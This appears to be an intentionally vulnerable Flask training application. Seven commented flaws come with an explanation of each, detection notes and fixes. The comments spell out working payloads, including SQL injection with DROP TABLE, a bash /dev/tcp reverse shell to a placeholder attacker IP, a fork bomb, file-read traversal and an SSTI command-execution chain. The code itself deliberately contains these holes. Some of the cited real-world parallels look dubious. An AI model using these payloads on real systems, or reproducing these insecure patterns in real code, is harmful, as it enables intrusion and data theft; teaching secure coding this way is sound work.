#!/usr/bin/env python3
"""
Vulnerable Flask Application — For Educational Purposes Only

NexusCore Technologies demo application.
All vulnerabilities below are intentional. Each is numbered, explained with
attacker capability, real-world impact, detection mechanism, and exact fix.
See REMEDIATION.md and the hardened branch for the corrected versions.
"""

from flask import Flask, request, render_template_string
import os
import subprocess
import sqlite3
import yaml

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Vulnerability 1: Hardcoded Credentials (CWE-798)
# ---------------------------------------------------------------------------
# Credentials embedded directly in source code are exposed to anyone with
# repository read access — including public forks, contributors, and any
# attacker who gains access to version control.
#
# Attacker capability:
#   - API_KEY can be used to authenticate as the application service account
#     against any downstream system that trusts it.
#   - DATABASE_PASSWORD gives direct access to the database outside of the
#     application layer — no exploit required, just a connection string.
#   - Both values persist in git history indefinitely even after removal;
#     an attacker with a stale clone retains access.
#
# Real-world parallel: Uber (2022) — hardcoded credentials in a private
# GitHub repo led to a full AWS, GCP, and internal systems compromise.
#
# Detection: Gitleaks scans the full git history on every push. It identifies
# both values via built-in regex rules: `generic-api-key` (sk-...) and
# `hashicorp-tf-password` patterns.
#
# Fix: Remove all hardcoded values. Source credentials at runtime:
#   DATABASE_PASSWORD = os.environ.get("DATABASE_PASSWORD")
#   API_KEY = os.environ.get("API_KEY")
# Store secrets in AWS Secrets Manager and inject via IAM instance profile.
# ---------------------------------------------------------------------------
DATABASE_PASSWORD = "super_secret_password_123"
API_KEY = "sk-proj-a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"


# ---------------------------------------------------------------------------
# Vulnerability 2: SQL Injection (CWE-89)
# ---------------------------------------------------------------------------
# f-string concatenation gives the attacker direct control over the SQL
# WHERE clause. The database executes whatever the attacker constructs.
#
# Attacker capability:
#   - Payload: ?username=' OR '1'='1
#     Returns every row in the users table in a single unauthenticated request.
#   - Payload: ?username='; DROP TABLE users;--
#     Destroys the entire users table permanently.
#   - Payload: ?username=' UNION SELECT name,sql,NULL FROM sqlite_master--
#     Dumps the full database schema, revealing all table names and columns.
#
# Real-world parallel: Heartland Payment Systems (2008) — SQL injection
# exposed 130 million card numbers, resulting in $145M in fines and
# settlements and becoming one of the largest data breaches in US history.
#
# Detection: CodeQL traces the tainted data flow from request.args.get()
# through to cursor.execute() at the AST level, flagging the unparameterised
# query as a confirmed CWE-89 sink.
#
# Fix: Use parameterised queries. The ? placeholder ensures user input is
# always treated as data — never interpreted as SQL syntax:
#   cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
# ---------------------------------------------------------------------------
def get_user(username):
    """Exposes SQL injection via unparameterised query construction."""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # BAD: f-string concatenation — attacker controls the WHERE clause directly
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()


@app.route('/user')
def user():
    """Route exposing the SQL injection vulnerability in get_user()."""
    username = request.args.get('username', '')
    result = get_user(username)
    return str(result)


# ---------------------------------------------------------------------------
# Vulnerability 3: Command Injection (CWE-78)
# ---------------------------------------------------------------------------
# shell=True passes the entire command string to /bin/sh. Any shell
# metacharacter in the user-supplied host parameter becomes a new command.
#
# Attacker capability:
#   - Payload: ?host=;id  — executes `id`, returns uid=0(root) if running
#     as root (confirmed by the missing USER instruction in the Dockerfile).
#   - Payload: ?host=;cat /etc/passwd  — reads the passwd file.
#   - Payload: ?host=;bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
#     Establishes a reverse shell, giving the attacker an interactive
#     terminal inside the container.
#   - From there: fork bomb (?host=;:(){ :|:& };:) crashes the container,
#     achieving denial of service.
#
# Real-world parallel: Shellshock (CVE-2014-6271) — command injection via
# Bash environment variables affected millions of servers running CGI scripts;
# patched in days but exploited in mass automated attacks within hours.
#
# Detection: CodeQL identifies the tainted flow from request.args.get()
# into subprocess with shell=True as a confirmed CWE-78 sink.
#
# Fix: Remove shell=True entirely. Pass arguments as a list:
#   import shlex
#   host = shlex.quote(request.args.get('host', 'localhost'))
#   result = subprocess.check_output(["ping", "-c", "1", host])
# Enforce an explicit allowlist of permitted hostnames.
# ---------------------------------------------------------------------------
@app.route('/ping')
def ping():
    """Vulnerable to command injection via shell=True."""
    host = request.args.get('host', 'localhost')
    # BAD: user input passed directly to shell — metacharacters execute as commands
    result = subprocess.check_output(f"ping -c 1 {host}", shell=True)
    return result


# ---------------------------------------------------------------------------
# Vulnerability 4: Server-Side Template Injection — SSTI (CWE-94)
# ---------------------------------------------------------------------------
# render_template_string() compiles and executes the string as a Jinja2
# template. When user input is interpolated into that string before
# rendering, the attacker controls the template itself.
#
# Attacker capability:
#   - Payload: ?name={{7*7}}  — evaluates to 49, confirming SSTI.
#   - Payload: ?name={{config.items()}}  — dumps the full Flask config
#     including SECRET_KEY and any other application secrets.
#   - Payload: ?name={{''.__class__.__mro__[1].__subclasses__()}}
#     Walks the Python class hierarchy to reach OS-level primitives.
#   - Full RCE: ?name={{request.application.__globals__.__builtins__
#     .__import__('os').popen('id').read()}}
#     Executes arbitrary OS commands inside the container.
#
# Real-world parallel: Uber HackerOne report #125980 (2016) — SSTI in a
# Python web application achieved full remote code execution, rated Critical.
#
# Detection: CodeQL flags the tainted data flow from request.args.get()
# into render_template_string() without sanitisation.
#
# Fix: Never pass user input into the template string itself. Pass it as
# a context variable to a static template:
#   return render_template_string("<h1>Hello {{ name }}!</h1>", name=name)
# The {{ name }} placeholder is evaluated safely — Jinja2 auto-escapes it.
# ---------------------------------------------------------------------------
@app.route('/greet')
def greet():
    """Vulnerable to Server-Side Template Injection."""
    name = request.args.get('name', 'Guest')
    # BAD: user input is interpolated into the template string before compilation
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)


# ---------------------------------------------------------------------------
# Vulnerability 5: Insecure Deserialisation — YAML (CWE-502)
# ---------------------------------------------------------------------------
# yaml.load() with FullLoader deserialises arbitrary Python objects.
# A crafted YAML payload can instantiate any class accessible in the
# Python runtime, including subprocess and os primitives.
#
# Attacker capability:
#   - CVE-2020-14343 in PyYAML 5.4.1 (CVSS 9.8 Critical) — this repo's
#     pinned version is directly vulnerable.
#   - Payload triggers arbitrary code execution during deserialisation,
#     before any application logic processes the result.
#   - No authentication or prior access required — the endpoint accepts
#     a query parameter over HTTP.
#
# Real-world parallel: SolarWinds Orion (2019) — deserialisation of
# untrusted YAML data was one of the lateral movement vectors in the
# SUNBURST supply chain attack affecting 18,000 organisations.
#
# Detection: Trivy SCA matches PyYAML 5.4.1 against the CVE database,
# reporting CVE-2020-14343 as Critical on every pipeline run.
# CodeQL also flags yaml.load() with FullLoader as an unsafe deserialisation
# sink.
#
# Fix: Replace yaml.load() with yaml.safe_load(), which only deserialises
# standard YAML scalars, sequences, and mappings — no Python objects:
#   config = yaml.safe_load(config_data)
# Upgrade PyYAML to >= 6.0 to eliminate the CVE entirely.
# ---------------------------------------------------------------------------
@app.route('/load_config')
def load_config():
    """Vulnerable to insecure YAML deserialisation — CVE-2020-14343."""
    config_data = request.args.get('config', '{}')
    # BAD: yaml.load with FullLoader — deserialises arbitrary Python objects
    config = yaml.load(config_data, Loader=yaml.FullLoader)
    return str(config)


# ---------------------------------------------------------------------------
# Vulnerability 6: Path Traversal (CWE-22)
# ---------------------------------------------------------------------------
# No validation on the filename parameter allows an attacker to use ../
# sequences to escape the intended /app/files/ directory and read any file
# accessible to the container process.
#
# Attacker capability:
#   - Payload: ?file=../../etc/passwd  — reads /etc/passwd, exposing all
#     user accounts on the container OS.
#   - Payload: ?file=../../proc/self/environ  — dumps all environment
#     variables, potentially exposing secrets injected at runtime.
#   - Payload: ?file=../../app/vulnerable_app.py  — reads the application
#     source code, revealing all hardcoded credentials and logic.
#   - Combined with the container running as root (Vulnerability 7 in
#     the Dockerfile), the entire container filesystem is readable.
#
# Real-world parallel: Accellion FTA (2021) — path traversal combined with
# SQL injection affected 100+ organisations including financial regulators
# and universities; data of 3.5 million people was exfiltrated.
#
# Detection: CodeQL traces the unsanitised filename from request.args.get()
# to the open() call, flagging it as a CWE-22 path traversal sink.
#
# Fix: Validate and canonicalise the path before use:
#   import os
#   base = os.path.abspath("/app/files")
#   target = os.path.abspath(os.path.join(base, filename))
#   if not target.startswith(base):
#       abort(400)  # Path traversal attempt — reject
# Maintain an explicit allowlist of permitted filenames as a second layer.
# ---------------------------------------------------------------------------
@app.route('/read_file')
def read_file():
    """Vulnerable to path traversal — no filename validation."""
    filename = request.args.get('file', 'default.txt')
    # BAD: no path validation — ../ sequences escape the intended directory
    with open(f"/app/files/{filename}", 'r') as f:
        return f.read()


# ---------------------------------------------------------------------------
# Vulnerability 7: Debug Mode Enabled in Production (CWE-94 / OWASP A05)
# ---------------------------------------------------------------------------
# Flask debug=True activates the Werkzeug debugger, which exposes a
# browser-based interactive Python console on unhandled exceptions.
# The console is protected by a PIN — but the PIN is derived from
# predictable values (MAC address, machine ID) and has been broken
# repeatedly in real-world attacks.
#
# Attacker capability:
#   - Any unhandled exception (easily triggered via malformed input to
#     any of the vulnerable routes above) opens the debugger console.
#   - Full stack traces including local variable values, file paths,
#     and environment variable contents are returned in every error
#     response — even without reaching the interactive console.
#   - If the Werkzeug PIN is derived or bypassed: full interactive
#     Python execution in the server process context.
#
# Real-world parallel: Patreon (2015) — a development server with
# debug mode accidentally left enabled in production exposed full
# source code, database credentials, and 2.3 million user records.
#
# Detection: CodeQL and Trivy both flag app.run(debug=True) as a
# misconfiguration. The Trivy container scan may also surface this
# via process inspection.
#
# Fix: Set debug=False and serve via a production WSGI server:
#   if __name__ == '__main__':
#       app.run(host='0.0.0.0', port=5000, debug=False)
# In production, remove app.run() entirely and use:
#   CMD ["gunicorn", "--bind", "0.0.0.0:5000", "vulnerable_app:app"]
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    # BAD: debug=True in production — exposes interactive debugger and stack traces
    app.run(host='0.0.0.0', port=5000, debug=True)
